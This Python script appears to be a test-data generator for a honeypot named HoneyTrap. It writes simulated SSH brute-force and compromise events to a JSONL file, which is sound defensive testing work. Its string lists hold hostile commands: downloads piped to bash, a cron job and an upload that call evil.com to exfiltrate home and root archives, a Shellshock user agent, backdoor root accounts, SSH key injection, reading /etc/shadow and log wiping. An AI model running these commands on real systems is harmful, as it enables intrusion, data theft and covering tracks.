#!/usr/bin/env python3
"""
HoneyTrap Test Data Generator

Generates realistic honeypot events with:
- Known malicious IP ranges (Tor exits, bulletproof hosting, etc.)
- Common brute-force username/password combinations
- Typical attacker commands and behaviors
- Realistic timing patterns
"""

import json
import random
import uuid
import argparse
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

# =============================================================================
# REALISTIC ATTACKER DATA
# =============================================================================

# Known malicious IP ranges and examples (for simulation only)
# These are commonly seen in honeypot data - mix of Tor exits, VPNs, bulletproof hosting
MALICIOUS_IPS = [
    # Tor Exit Nodes (examples - these rotate frequently)
    "185.220.101.42", "185.220.101.33", "185.220.101.1",
    "185.220.102.8", "185.220.102.244", "185.220.102.250",
    "45.154.255.147", "45.154.255.139", "45.154.255.138",
    "51.75.64.23", "51.75.64.19", "51.75.64.15",
    
    # Russian bulletproof hosting
    "194.26.192.64", "194.26.192.71", "194.26.192.87",
    "91.243.80.110", "91.243.80.111", "91.243.80.112",
    "185.117.88.84", "185.117.88.91", "185.117.88.95",
    
    # Chinese IP ranges (common scan sources)
    "218.92.0.107", "218.92.0.108", "218.92.0.112",
    "61.177.172.140", "61.177.172.141", "61.177.172.179",
    "122.194.229.40", "122.194.229.42", "122.194.229.45",
    
    # Vietnamese scan sources
    "113.160.92.128", "113.160.92.134", "113.160.92.142",
    "14.225.192.40", "14.225.192.42", "14.225.192.44",
    
    # Brazilian attack sources
    "179.60.147.21", "179.60.147.33", "179.60.147.45",
    "45.229.54.18", "45.229.54.27", "45.229.54.56",
    
    # Iranian scan sources
    "5.160.218.90", "5.160.218.91", "5.160.218.95",
    
    # Known botnet C2/scanner IPs (historical examples)
    "141.98.10.60", "141.98.10.63", "141.98.10.65",
    "193.32.162.65", "193.32.162.72", "193.32.162.80",
    "45.95.168.194", "45.95.168.201", "45.95.168.217",
    
    # Eastern European VPS providers (commonly abused)
    "89.248.165.52", "89.248.165.61", "89.248.165.73",
    "80.82.77.33", "80.82.77.139", "80.82.77.227",
    "71.6.135.131", "71.6.146.185", "71.6.146.186",
]

# Common brute-force usernames (ranked by frequency in real honeypots)
USERNAMES = [
    "root", "admin", "user", "test", "guest", "ubuntu", "oracle",
    "postgres", "mysql", "ftpuser", "www", "www-data", "apache",
    "nginx", "git", "jenkins", "deploy", "ansible", "vagrant",
    "pi", "raspberrypi", "odroid", "ec2-user", "centos", "debian",
    "administrator", "support", "info", "mail", "webmaster",
    "backup", "operator", "nagios", "zabbix", "minecraft",
    "teamspeak", "ts3", "csgo", "steam", "ftp", "anonymous",
    "default", "ubnt", "admin1", "user1", "test1", "demo",
]

# Common brute-force passwords (ranked by frequency)
PASSWORDS = [
    "123456", "password", "admin", "root", "123456789", "12345678",
    "1234", "12345", "password123", "admin123", "root123", "pass",
    "P@ssw0rd", "qwerty", "abc123", "111111", "123123", "admin@123",
    "letmein", "welcome", "monkey", "dragon", "master", "login",
    "passw0rd", "hello", "password1", "qwerty123", "1q2w3e4r",
    "1qaz2wsx", "trustno1", "changeme", "test123", "guest",
    "default", "123qwe", "zxcvbnm", "asdfghjkl", "000000",
    "1234567890", "p@ssword", "admin1234", "root1234", "toor",
    "raspberry", "alpine", "dietpi", "ubuntu", "centos", "debian",
    "", "x", "123", "a", "pass123", "admin123!", "P@ssword1",
]

# Post-authentication commands (what attackers run after getting in)
RECON_COMMANDS = [
    "id", "whoami", "pwd", "uname -a", "cat /etc/passwd",
    "cat /etc/shadow", "w", "who", "last", "history",
    "ps aux", "ps -ef", "netstat -an", "ss -tulpn",
    "ifconfig", "ip addr", "ip route", "cat /etc/hosts",
    "cat /etc/resolv.conf", "df -h", "free -m", "uptime",
    "cat /proc/cpuinfo", "cat /proc/meminfo", "lscpu",
    "hostname", "hostname -I", "cat /etc/issue",
    "cat /etc/os-release", "lsb_release -a", "arch",
    "getent passwd", "cat /etc/crontab", "crontab -l",
    "systemctl list-units", "service --status-all",
    "ls -la /root", "ls -la /home", "find / -perm -4000 2>/dev/null",
    "cat ~/.ssh/authorized_keys", "cat ~/.bash_history",
]

PERSISTENCE_COMMANDS = [
    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
    "crontab -e",
    "(crontab -l 2>/dev/null; echo '* * * * * /tmp/.x') | crontab -",
    "echo '* * * * * curl http://evil.com/shell.sh | bash' >> /etc/crontab",
    "useradd -o -u 0 -g 0 hacker",
    "usermod -aG sudo hacker",
    "echo 'hacker:password' | chpasswd",
    "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config",
    "systemctl restart sshd",
]

DOWNLOAD_COMMANDS = [
    "wget http://185.220.101.42/bins.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    "curl -s http://194.26.192.64/miner -o /tmp/kworker && chmod 777 /tmp/kworker",
    "cd /tmp && wget http://91.243.80.110/bot.x86_64",
    "curl http://45.95.168.194/setup.sh | bash",
    "wget -q http://61.177.172.140/scan -O- | sh",
    "cd /var/tmp && curl -O http://141.98.10.60/xmrig && chmod +x xmrig",
    "busybox wget http://113.160.92.128/mirai -O /tmp/mirai",
    "tftp 179.60.147.21 -c get bot",
    "/bin/busybox wget http://218.92.0.107/arm7",
]

CRYPTOMINER_COMMANDS = [
    "./xmrig -o pool.minexmr.com:4444 -u wallet -p x",
    "nohup ./kworker --donate-level 0 -o stratum+tcp://xmr.pool.com:3333 &",
    "screen -dmS miner ./minerd -a cryptonight -o stratum+tcp://",
    "/tmp/.hidden/xmr-stak -c /tmp/.config.txt",
]

LATERAL_MOVEMENT = [
    "cat /etc/passwd | cut -d: -f1",
    "for i in $(cat /root/.ssh/known_hosts | cut -d' ' -f1); do ssh $i 'id'; done",
    "ssh -o StrictHostKeyChecking=no root@192.168.1.1",
    "scp /tmp/bot root@192.168.1.100:/tmp/",
    "for ip in $(seq 1 254); do ping -c1 192.168.1.$ip; done",
    "nmap -sn 192.168.1.0/24",
]

CLEANUP_COMMANDS = [
    "history -c", "rm -rf ~/.bash_history", "unset HISTFILE",
    "rm -rf /var/log/*", "echo '' > /var/log/auth.log",
    "rm -rf /tmp/*", "rm -rf /var/tmp/*",
    "kill -9 $(pgrep -f 'tcpdump|wireshark')",
]

# Attack sequences (realistic multi-command sessions)
ATTACK_SEQUENCES = [
    # Basic recon
    ["id", "uname -a", "cat /etc/passwd", "w"],
    
    # Quick cryptominer drop
    ["cd /tmp", "wget http://185.220.101.42/xmrig -O .x", "chmod +x .x", "nohup ./.x &"],
    
    # Mirai-style IoT infection
    ["cd /tmp || cd /var/run || cd /mnt || cd /root || cd /", 
     "wget http://61.177.172.140/bins.sh", "chmod 777 bins.sh", "./bins.sh"],
    
    # Full recon -> persistence -> miner
    ["whoami", "id", "uname -a", "cat /proc/cpuinfo", "free -m",
     "cd /tmp", "curl -O http://194.26.192.64/setup.sh", "chmod +x setup.sh",
     "(crontab -l; echo '@reboot /tmp/setup.sh') | crontab -",
     "./setup.sh"],
    
    # Data exfiltration attempt
    ["cat /etc/shadow", "cat /etc/passwd", 
     "tar czf /tmp/data.tar.gz /home /root 2>/dev/null",
     "curl -X POST -F 'file=@/tmp/data.tar.gz' http://evil.com/upload"],
    
    # SSH key injection
    ["mkdir -p ~/.ssh", "chmod 700 ~/.ssh",
     "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAA...' >> ~/.ssh/authorized_keys",
     "chmod 600 ~/.ssh/authorized_keys"],
]

# User agents for HTTP honeypots
USER_AGENTS = [
    # Scanning tools
    "Mozilla/5.0 zgrab/0.x",
    "masscan/1.0",
    "Nmap Scripting Engine",
    "python-requests/2.28.0",
    "Go-http-client/1.1",
    "curl/7.68.0",
    "Wget/1.20.3",
    
    # Bots
    "Hello, World",
    "() { :;}; /bin/bash -c 'wget http://evil.com/shell'",
    
    # Real browsers (for credential stuffing)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
]

# =============================================================================
# EVENT GENERATOR
# =============================================================================

class HoneypotEventGenerator:
    def __init__(self, honeypot_id="ssh-01", honeypot_ip="10.0.0.50", honeypot_port=22):
        self.honeypot_id = honeypot_id
        self.honeypot_ip = honeypot_ip
        self.honeypot_port = honeypot_port
        
    def generate_event_id(self):
        return str(uuid.uuid4())
    
    def generate_session_id(self):
        return str(uuid.uuid4())
    
    def generate_timestamp(self, base_time=None, offset_seconds=0):
        if base_time is None:
            base_time = datetime.now(timezone.utc)
        return (base_time + timedelta(seconds=offset_seconds)).isoformat()
    
    def create_base_event(self, session_id, source_ip, category, timestamp=None):
        """Create a base event structure matching HoneyTrap format"""
        return {
            "id": self.generate_event_id(),
            "session_id": session_id,
            "timestamp": timestamp or self.generate_timestamp(),
            "protocol": "SSH",
            "category": category,
            "severity": self._get_severity(category),
            "source": {
                "ip": source_ip,
                "port": random.randint(40000, 65000),
                "hostname": None,
                "geo": self._generate_geo(source_ip),
            },
            "destination": {
                "ip": self.honeypot_ip,
                "port": self.honeypot_port,
                "honeypot_id": self.honeypot_id,
            }
        }
    
    def _get_severity(self, category):
        severity_map = {
            "Connection": "Low",
            "Authentication": "Medium",
            "Command": "High",
            "FileTransfer": "High",
            "Malware": "Critical",
        }
        return severity_map.get(category, "Medium")
    
    def _generate_geo(self, ip):
        """Generate fake but realistic geo data based on IP patterns"""
        # Map IP prefixes to countries (simplified)
        geo_map = {
            "185.220": {"country_code": "DE", "country": "Germany", "city": "Frankfurt", "asn": 24940, "org": "Hetzner Online GmbH"},
            "194.26": {"country_code": "RU", "country": "Russia", "city": "Moscow", "asn": 49505, "org": "Selectel"},
            "91.243": {"country_code": "RU", "country": "Russia", "city": "St Petersburg", "asn": 48282, "org": "Masterhost"},
            "218.92": {"country_code": "CN", "country": "China", "city": "Nanjing", "asn": 4134, "org": "Chinanet"},
            "61.177": {"country_code": "CN", "country": "China", "city": "Jiangsu", "asn": 4134, "org": "Chinanet"},
            "122.194": {"country_code": "CN", "country": "China", "city": "Jiangsu", "asn": 4134, "org": "Chinanet"},
            "113.160": {"country_code": "VN", "country": "Vietnam", "city": "Hanoi", "asn": 45899, "org": "VNPT"},
            "14.225": {"country_code": "VN", "country": "Vietnam", "city": "Hanoi", "asn": 45899, "org": "VNPT"},
            "179.60": {"country_code": "BR", "country": "Brazil", "city": "Sao Paulo", "asn": 28573, "org": "Claro"},
            "45.229": {"country_code": "BR", "country": "Brazil", "city": "Rio", "asn": 263009, "org": "Forte Telecom"},
            "5.160": {"country_code": "IR", "country": "Iran", "city": "Tehran", "asn": 44244, "org": "Irancell"},
            "141.98": {"country_code": "NL", "country": "Netherlands", "city": "Amsterdam", "asn": 209588, "org": "Flyservers"},
            "45.95": {"country_code": "NL", "country": "Netherlands", "city": "Amsterdam", "asn": 212238, "org": "Datacamp"},
            "89.248": {"country_code": "NL", "country": "Netherlands", "city": "Amsterdam", "asn": 202425, "org": "IP Volume"},
            "80.82": {"country_code": "NL", "country": "Netherlands", "city": "Amsterdam", "asn": 202425, "org": "IP Volume"},
            "45.154": {"country_code": "DE", "country": "Germany", "city": "Nuremberg", "asn": 60729, "org": "Zwiebelfreunde"},
            "51.75": {"country_code": "FR", "country": "France", "city": "Gravelines", "asn": 16276, "org": "OVH SAS"},
            "193.32": {"country_code": "UA", "country": "Ukraine", "city": "Kyiv", "asn": 57494, "org": "Deltahost"},
            "71.6": {"country_code": "US", "country": "United States", "city": "Ann Arbor", "asn": 19994, "org": "Censys"},
        }
        
        prefix = ".".join(ip.split(".")[:2])
        geo = geo_map.get(prefix, {
            "country_code": "XX",
            "country": "Unknown",
            "city": "Unknown",
            "asn": 0,
            "org": "Unknown"
        })
        
        return {
            "country_code": geo["country_code"],
            "country": geo["country"],
            "city": geo["city"],
            "latitude": round(random.uniform(-60, 60), 4),
            "longitude": round(random.uniform(-180, 180), 4),
            "asn": geo["asn"],
            "org": geo["org"],
        }
    
    def generate_connection_event(self, session_id, source_ip, timestamp=None):
        event = self.create_base_event(session_id, source_ip, "Connection", timestamp)
        return event
    
    def generate_auth_event(self, session_id, source_ip, username, password, success=False, timestamp=None):
        event = self.create_base_event(session_id, source_ip, "Authentication", timestamp)
        event["credentials"] = {
            "username": username,
            "password": password,
            "ssh_key": None,
            "auth_method": "password",
            "success": success,
        }
        if success:
            event["severity"] = "High"
        return event
    
    def generate_command_event(self, session_id, source_ip, command, output=None, timestamp=None):
        event = self.create_base_event(session_id, source_ip, "Command", timestamp)
        
        # Parse command
        parts = command.split()
        cmd_name = parts[0] if parts else command
        args = parts[1:] if len(parts) > 1 else None
        
        event["command"] = {
            "command": command,
            "command_name": cmd_name,
            "arguments": args,
            "output": output,
            "working_directory": "/root" if random.random() > 0.5 else "/tmp",
        }
        
        # Elevate severity for dangerous commands
        dangerous = ["wget", "curl", "chmod", "useradd", "crontab", "rm", "scp", "ssh"]
        if any(d in command.lower() for d in dangerous):
            event["severity"] = "Critical"
        
        return event
    
    def generate_disconnect_event(self, session_id, source_ip, timestamp=None):
        event = self.create_base_event(session_id, source_ip, "Disconnection", timestamp)
        event["severity"] = "Low"
        return event
    
    def generate_brute_force_session(self, source_ip=None, attempts=None):
        """Generate a typical brute-force attack session"""
        if source_ip is None:
            source_ip = random.choice(MALICIOUS_IPS)
        if attempts is None:
            attempts = random.randint(3, 20)
        
        session_id = self.generate_session_id()
        base_time = datetime.now(timezone.utc) - timedelta(minutes=random.randint(0, 60))
        events = []
        offset = 0
        
        # Connection
        events.append(self.generate_connection_event(
            session_id, source_ip, self.generate_timestamp(base_time, offset)
        ))
        offset += random.uniform(0.1, 0.5)
        
        # Failed auth attempts
        for i in range(attempts - 1):
            username = random.choice(USERNAMES)
            password = random.choice(PASSWORDS)
            events.append(self.generate_auth_event(
                session_id, source_ip, username, password, False,
                self.generate_timestamp(base_time, offset)
            ))
            offset += random.uniform(0.5, 3.0)
        
        # Final attempt (sometimes successful)
        success = random.random() < 0.15  # 15% success rate
        username = random.choice(USERNAMES[:10])  # More common usernames
        password = random.choice(PASSWORDS[:15])  # More common passwords
        events.append(self.generate_auth_event(
            session_id, source_ip, username, password, success,
            self.generate_timestamp(base_time, offset)
        ))
        offset += random.uniform(0.1, 0.5)
        
        # If successful, run some commands
        if success:
            commands = random.choice(ATTACK_SEQUENCES)
            for cmd in commands:
                events.append(self.generate_command_event(
                    session_id, source_ip, cmd,
                    timestamp=self.generate_timestamp(base_time, offset)
                ))
                offset += random.uniform(1.0, 5.0)
        
        # Disconnect
        events.append(self.generate_disconnect_event(
            session_id, source_ip, self.generate_timestamp(base_time, offset)
        ))
        
        return events
    
    def generate_automated_scan_session(self, source_ip=None):
        """Generate a quick automated scan (1-2 attempts, fast)"""
        if source_ip is None:
            source_ip = random.choice(MALICIOUS_IPS)
        
        session_id = self.generate_session_id()
        base_time = datetime.now(timezone.utc) - timedelta(minutes=random.randint(0, 120))
        events = []
        offset = 0
        
        # Connection
        events.append(self.generate_connection_event(
            session_id, source_ip, self.generate_timestamp(base_time, offset)
        ))
        offset += 0.1
        
        # Quick auth attempt
        events.append(self.generate_auth_event(
            session_id, source_ip,
            random.choice(["root", "admin"]),
            random.choice(["admin", "root", "123456", ""]),
            False,
            self.generate_timestamp(base_time, offset)
        ))
        offset += 0.2
        
        # Disconnect
        events.append(self.generate_disconnect_event(
            session_id, source_ip, self.generate_timestamp(base_time, offset)
        ))
        
        return events
    
    def generate_successful_compromise_session(self, source_ip=None):
        """Generate a full compromise: brute force -> success -> post-exploitation"""
        if source_ip is None:
            source_ip = random.choice(MALICIOUS_IPS)
        
        session_id = self.generate_session_id()
        base_time = datetime.now(timezone.utc) - timedelta(minutes=random.randint(0, 30))
        events = []
        offset = 0
        
        # Connection
        events.append(self.generate_connection_event(
            session_id, source_ip, self.generate_timestamp(base_time, offset)
        ))
        offset += 0.2
        
        # A few failed attempts
        for _ in range(random.randint(2, 5)):
            events.append(self.generate_auth_event(
                session_id, source_ip,
                random.choice(USERNAMES),
                random.choice(PASSWORDS),
                False,
                self.generate_timestamp(base_time, offset)
            ))
            offset += random.uniform(1, 3)
        
        # Successful auth
        events.append(self.generate_auth_event(
            session_id, source_ip, "root", "admin123", True,
            self.generate_timestamp(base_time, offset)
        ))
        offset += 0.5
        
        # Recon phase
        for cmd in random.sample(RECON_COMMANDS, min(8, len(RECON_COMMANDS))):
            events.append(self.generate_command_event(
                session_id, source_ip, cmd,
                timestamp=self.generate_timestamp(base_time, offset)
            ))
            offset += random.uniform(0.5, 2.0)
        
        # Download malware
        for cmd in random.sample(DOWNLOAD_COMMANDS, min(2, len(DOWNLOAD_COMMANDS))):
            events.append(self.generate_command_event(
                session_id, source_ip, cmd,
                timestamp=self.generate_timestamp(base_time, offset)
            ))
            offset += random.uniform(2.0, 5.0)
        
        # Persistence
        for cmd in random.sample(PERSISTENCE_COMMANDS, min(2, len(PERSISTENCE_COMMANDS))):
            events.append(self.generate_command_event(
                session_id, source_ip, cmd,
                timestamp=self.generate_timestamp(base_time, offset)
            ))
            offset += random.uniform(1.0, 3.0)
        
        # Cleanup
        for cmd in random.sample(CLEANUP_COMMANDS, min(2, len(CLEANUP_COMMANDS))):
            events.append(self.generate_command_event(
                session_id, source_ip, cmd,
                timestamp=self.generate_timestamp(base_time, offset)
            ))
            offset += random.uniform(0.5, 1.0)
        
        # Disconnect
        events.append(self.generate_disconnect_event(
            session_id, source_ip, self.generate_timestamp(base_time, offset)
        ))
        
        return events


def generate_test_data(output_file, num_sessions=50, mode="mixed"):
    """Generate test data and write to file"""
    generator = HoneypotEventGenerator()
    all_events = []
    
    print(f"[*] Generating {num_sessions} attack sessions...")
    
    for i in range(num_sessions):
        if mode == "mixed":
            # Realistic distribution: 60% scans, 30% brute force, 10% compromise
            r = random.random()
            if r < 0.60:
                events = generator.generate_automated_scan_session()
            elif r < 0.90:
                events = generator.generate_brute_force_session()
            else:
                events = generator.generate_successful_compromise_session()
        elif mode == "scans":
            events = generator.generate_automated_scan_session()
        elif mode == "bruteforce":
            events = generator.generate_brute_force_session()
        elif mode == "compromise":
            events = generator.generate_successful_compromise_session()
        else:
            events = generator.generate_brute_force_session()
        
        all_events.extend(events)
        
        if (i + 1) % 10 == 0:
            print(f"    Generated {i + 1}/{num_sessions} sessions ({len(all_events)} events)")
    
    # Sort by timestamp
    all_events.sort(key=lambda e: e["timestamp"])
    
    # Write to file
    print(f"[*] Writing {len(all_events)} events to {output_file}")
    with open(output_file, "a") as f:
        for event in all_events:
            f.write(json.dumps(event) + "\n")
    
    # Statistics
    unique_ips = len(set(e["source"]["ip"] for e in all_events))
    auth_events = [e for e in all_events if e["category"] == "Authentication"]
    successful_auths = len([e for e in auth_events if e.get("credentials", {}).get("success")])
    command_events = len([e for e in all_events if e["category"] == "Command"])
    
    print(f"\n[+] Generation complete!")
    print(f"    Total events: {len(all_events)}")
    print(f"    Unique IPs: {unique_ips}")
    print(f"    Auth attempts: {len(auth_events)}")
    print(f"    Successful auths: {successful_auths}")
    print(f"    Commands captured: {command_events}")
    
    # Show some sample IPs
    sample_ips = random.sample(list(set(e["source"]["ip"] for e in all_events)), min(5, unique_ips))
    print(f"\n[*] Sample attacker IPs: {', '.join(sample_ips)}")
    
    return all_events


def stream_events(output_file, interval=2.0):
    """Continuously stream new events (for live testing)"""
    generator = HoneypotEventGenerator()
    print(f"[*] Streaming events to {output_file} (interval: {interval}s)")
    print("    Press Ctrl+C to stop\n")
    
    event_count = 0
    try:
        while True:
            # Generate a random session type
            r = random.random()
            if r < 0.70:
                events = generator.generate_automated_scan_session()
            elif r < 0.95:
                events = generator.generate_brute_force_session()
            else:
                events = generator.generate_successful_compromise_session()
            
            # Write events one at a time with realistic delays
            with open(output_file, "a") as f:
                for event in events:
                    # Update timestamp to now
                    event["timestamp"] = datetime.now(timezone.utc).isoformat()
                    f.write(json.dumps(event) + "\n")
                    f.flush()
                    event_count += 1
                    
                    severity_colors = {
                        "Low": "\033[32m",      # Green
                        "Medium": "\033[33m",   # Yellow
                        "High": "\033[91m",     # Red
                        "Critical": "\033[95m", # Magenta
                    }
                    reset = "\033[0m"
                    color = severity_colors.get(event["severity"], "")
                    
                    print(f"[{event_count}] {color}{event['category']:<15}{reset} "
                          f"from {event['source']['ip']:<15} "
                          f"({event['source']['geo']['country_code']})")
                    
                    time.sleep(random.uniform(0.1, 0.5))
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print(f"\n[*] Stopped. Generated {event_count} events total.")


def main():
    parser = argparse.ArgumentParser(
        description="Generate realistic honeypot test data",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --output events.jsonl --sessions 100
  %(prog)s --output events.jsonl --sessions 50 --mode compromise
  %(prog)s --output events.jsonl --stream --interval 1.0
        """
    )
    
    parser.add_argument(
        "-o", "--output",
        default="events.jsonl",
        help="Output file path (default: events.jsonl)"
    )
    parser.add_argument(
        "-n", "--sessions",
        type=int,
        default=50,
        help="Number of attack sessions to generate (default: 50)"
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["mixed", "scans", "bruteforce", "compromise"],
        default="mixed",
        help="Type of attacks to generate (default: mixed)"
    )
    parser.add_argument(
        "--stream",
        action="store_true",
        help="Stream events continuously (for live testing)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=2.0,
        help="Interval between sessions in stream mode (default: 2.0s)"
    )
    parser.add_argument(
        "--clear",
        action="store_true",
        help="Clear output file before writing"
    )
    
    args = parser.parse_args()
    
    if args.clear and Path(args.output).exists():
        print(f"[*] Clearing {args.output}")
        open(args.output, "w").close()
    
    print("""
╔═══════════════════════════════════════════════════════════════╗
║           HoneyTrap Test Data Generator                       ║
╠═══════════════════════════════════════════════════════════════╣
║  Generating realistic attack traffic for testing              ║
╚═══════════════════════════════════════════════════════════════╝
""")
    
    if args.stream:
        stream_events(args.output, args.interval)
    else:
        generate_test_data(args.output, args.sessions, args.mode)


if __name__ == "__main__":
    main()
